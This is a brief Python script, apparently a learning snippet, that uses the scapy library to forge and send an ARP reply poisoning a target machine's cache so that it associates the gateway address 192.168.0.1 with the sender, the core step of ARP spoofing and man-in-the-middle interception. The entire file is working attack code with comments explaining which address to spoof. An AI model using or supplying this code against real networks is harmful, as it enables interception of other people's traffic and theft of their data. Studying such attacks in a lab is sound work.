import scapy.all as scapy

#pdst is the target IP
#hwdst is the target MAC address
#psrc is the IP address you want to spoof
packet = scapy.ARP(op=2, pdst="192.168.0.66", hwdst="28:ad:18:e3:3e:0a", psrc="192.168.0.1")
scapy.send(packet)
print(packet.show)
print(packet.summary())